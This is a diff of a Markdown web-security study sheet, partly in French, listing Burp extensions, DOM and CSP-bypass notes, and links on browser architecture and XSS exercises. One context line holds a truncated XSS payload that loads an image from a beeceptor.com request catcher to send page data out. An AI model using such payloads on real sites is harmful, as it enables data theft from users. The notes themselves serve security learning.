@@ -17,6 +17,8 @@
 
 ### Burp
 
+`Never trust user input`
+
 - [Hackvertor](https://github.com/hackvertor/hackvertor)
 - [JWT](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6)
 - [Param Miner](https://github.com/portswigger/param-miner)
@@ -70,3 +72,11 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 -> appel ou accès aux éléments du DOM (ex document.getElementByID)
 
 [CSP Bypass](https://csplite.com/csp320/)
+
+## AST
+
+https://seal9055.com/blog/browser/browser_architecture
+
+## Exercices
+
+https://alert.zeyu2001.com/
